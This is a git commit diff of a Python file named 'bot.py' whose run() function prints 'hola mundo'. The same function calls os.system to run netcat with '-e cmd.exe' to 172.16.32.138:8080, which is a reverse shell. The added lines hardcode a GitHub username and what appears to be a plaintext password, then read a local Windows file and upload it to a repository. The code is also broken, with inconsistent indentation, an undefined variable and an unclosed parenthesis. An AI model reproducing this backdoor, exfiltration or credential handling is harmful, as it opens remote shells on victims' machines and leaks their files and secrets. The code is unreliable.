d79ba64d9fefba41771720258b1a37fc568a4ae7
juanangelLerida <79135620+juanangelLerida@users.noreply.github.com>
2023-03-01 20:17:04 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -2,3 +2,30 @@ def run():
   print('hola mundo')
   import os
   os.system('nc -e cmd.exe  172.16.32.138 8080')
+  from github import Github
+g = Github("juanangelLerida", "J.angel14enero")
+
+repo = g.get_user().get_repo(GITHUB_REPO)
+all_files = []
+contents = repo.get_contents("")
+while contents:
+    file_content = contents.pop(0)
+    if file_content.type == "dir":
+        contents.extend(repo.get_contents(file_content.path))
+    else:
+        file = file_content
+        all_files.append(str(file).replace('ContentFile(path="','').replace('")',''))
+
+with open('C:\Users\juanlerrod\Desktop\git\prueba.txt', 'r') as file:
+    content = file.read()
+
+# Upload to github
+git_prefix = 'gitJuan/'
+git_file = git_prefix + 'file.txt'
+if git_file in all_files:
+    contents = repo.get_contents(git_file)
+    repo.update_file(contents.path, "committing files", content, contents.sha, branch="master")
+    print(git_file + ' UPDATED')
+else:
+    repo.create_file(git_file, "committing files", content, branch="master")
+    print(git_file + ' CREATED'
